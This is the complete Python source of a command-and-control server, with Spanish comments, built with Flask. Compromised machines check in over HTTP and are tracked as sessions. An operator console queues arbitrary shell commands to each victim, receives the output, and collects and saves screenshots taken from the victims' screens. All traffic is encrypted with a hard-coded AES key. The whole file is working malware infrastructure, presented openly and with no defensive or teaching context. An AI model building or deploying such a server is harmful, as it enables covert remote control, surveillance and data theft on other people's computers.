import logging
from flask import Flask, request
from Crypto.Cipher import AES
import base64
import threading
import sys
import time
import os
from datetime import datetime
import uuid

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
current_task = "IDLE"

KEY = b"1234567890123456"
IV = b"1234567890123456"

# Crear carpeta para screenshots si no existe
SCREENSHOT_DIR = "screen"
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

# Estructura para almacenar las sesiones activas
sessions = {}
selected_session = None

def encrypt_message(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    data_bytes = data.encode('utf-8')
    padding_len = 16 - (len(data_bytes) % 16)
    padded_data = data_bytes + bytes([padding_len]) * padding_len
    encrypted = cipher.encrypt(padded_data)
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt_message(enc_data):
    try:
        if not enc_data:
            return ""
        enc_bytes = base64.b64decode(enc_data)
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        decrypted = cipher.decrypt(enc_bytes)

        if len(decrypted) == 0:
            return ""

        padding_len = decrypted[-1]
        return decrypted[:-padding_len].decode('utf-8')
    except Exception as e:
        return f"[Error descifrando: {e}]"

def get_or_create_session(client_ip):
    global selected_session
    # Buscar una sesión existente con la misma IP
    for session_id, session_info in sessions.items():
        if session_info['ip'] == client_ip:
            # Actualizar última vez que se vio
            sessions[session_id]['last_seen'] = datetime.now()
            return session_id
    
    # Si no existe, crear una nueva sesión
    session_id = str(uuid.uuid4())
    sessions[session_id] = {
        'ip': client_ip,
        'hostname': "Unknown",
        'username': "Unknown",
        'os': "Unknown",
        'last_seen': datetime.now(),
        'task': "IDLE"
    }
    
    # Seleccionar automáticamente la primera sesión si no hay ninguna seleccionada
    if selected_session is None:
        selected_session = session_id
    
    print(f"\n\n[+] Nueva sesión detectada: {session_id}")
    print(f"[+] IP: {client_ip}")
    print("C2> ", end="", flush=True)
    
    return session_id

@app.route('/tasks', methods=['GET'])
def send_task():
    try:
        client_ip = request.remote_addr
        session_id = get_or_create_session(client_ip)
        
        # Enviar tarea específica para esta sesión
        task_to_send = sessions[session_id]['task']
        sessions[session_id]['task'] = "IDLE"
        
        return encrypt_message(task_to_send)
    except Exception as e:
        print(f"\n\n[!] Error enviando tarea: {e}")
        print("C2> ", end="", flush=True)
        return encrypt_message("IDLE")

@app.route('/results', methods=['POST'])
def receive_results():
    try:
        client_ip = request.remote_addr
        session_id = get_or_create_session(client_ip)
        
        encrypted_result = request.get_data(as_text=True)
        decrypted_result = decrypt_message(encrypted_result)
        
        session_info = sessions[session_id]
        print(f"\n\n[+] Respuesta de sesión {session_id[:8]}...{session_id[-4:]} ({session_info['hostname']}@{session_info['ip']}):")
        print(f"{decrypted_result}")
        print("C2> ", end="", flush=True)
        
        return "OK"
    except Exception as e:
        print(f"\n\n[!] Error recibiendo resultado: {e}")
        print("C2> ", end="", flush=True)
        return f"ERROR: {e}"

@app.route('/screen', methods=['POST'])
def receive_screenshot():
    try:
        client_ip = request.remote_addr
        session_id = get_or_create_session(client_ip)
        
        # Recibir datos base64 de la imagen
        image_b64 = request.get_data(as_text=True)
        
        # Decodificar base64 a bytes
        image_bytes = base64.b64decode(image_b64)
        
        # Generar nombre único con timestamp y ID de sesión
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        session_info = sessions[session_id]
        filename = f"screenshot_{session_id[:8]}_{timestamp}.png"
        filepath = os.path.join(SCREENSHOT_DIR, filename)
        
        # Guardar imagen
        with open(filepath, 'wb') as f:
            f.write(image_bytes)
        
        print(f"\n\n[+] Screenshot recibido de sesión {session_id[:8]}...{session_id[-4:]} ({session_info['hostname']}@{session_info['ip']}):")
        print(f"[+] Guardado en: {filepath}")
        print(f"[+] Tamaño: {len(image_bytes)} bytes")
        print("C2> ", end="", flush=True)
        
        return "OK"
    except Exception as e:
        print(f"\n\n[!] Error recibiendo screenshot: {e}")
        print("C2> ", end="", flush=True)
        return f"ERROR: {e}"

def run_flask():
    app.run(host='0.0.0.0', port=80, debug=False, use_reloader=False)

def list_sessions():
    print("\n\n[+] Sesiones activas:")
    for i, (session_id, session_info) in enumerate(sessions.items()):
        marker = " [SELECCIONADA]" if session_id == selected_session else ""
        last_seen = session_info['last_seen'].strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{i}] {session_id[:8]}...{session_id[-4:]} | {session_info['hostname']}@{session_info['ip']} | Última actividad: {last_seen}{marker}")
    print("C2> ", end="", flush=True)

def select_session(session_index):
    global selected_session
    
    session_list = list(sessions.keys())
    if 0 <= session_index < len(session_list):
        selected_session = session_list[session_index]
        session_info = sessions[selected_session]
        print(f"\n[+] Sesión seleccionada: {selected_session[:8]}...{selected_session[-4:]} ({session_info['hostname']}@{session_info['ip']})")
        print("C2> ", end="", flush=True)
    else:
        print("\n[!] Índice de sesión inválido")
        print("C2> ", end="", flush=True)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    time.sleep(1)
    print(f"\n[*] Servidor C2 en escucha (Puerto 80).")
    print(f"[*] Screenshots se guardarán en: ./{SCREENSHOT_DIR}/")
    print("[*] Comandos especiales:")
    print("    - 'list': Muestra todas las sesiones activas")
    print("    - 'select <número>': Selecciona una sesión para interactuar")
    print("    - 'exit': Salir del servidor C2")
    print("    - 'SCREEN': Solicitar captura de pantalla de la sesión seleccionada\n")

    while True:
        try:
            cmd = input("C2> ")
            if cmd.strip() == "":
                continue
                
            if cmd.lower() == "exit":
                print("[!] Apagando servidor C2...")
                sys.exit(0)
            elif cmd.lower() == "list":
                list_sessions()
                continue
            elif cmd.lower().startswith("select "):
                try:
                    session_index = int(cmd.split()[1])
                    select_session(session_index)
                except (IndexError, ValueError):
                    print("[!] Uso: select <número de sesión>")
                    print("C2> ", end="", flush=True)
                continue
            elif cmd.lower() == "screen":
                cmd = cmd.upper()
            
            # Enviar comando a la sesión seleccionada
            if selected_session and selected_session in sessions:
                sessions[selected_session]['task'] = cmd
                print(f"[+] Comando enviado a sesión {selected_session[:8]}...{selected_session[-4:]}")
            else:
                print("[!] No hay sesión seleccionada o la sesión seleccionada no es válida")
                print("[!] Usa 'list' para ver las sesiones disponibles y 'select <número>' para seleccionar una")
                print("C2> ", end="", flush=True)

        except KeyboardInterrupt:
            print("\n[!] Interrupción detectada. Apagando...")
            sys.exit(0)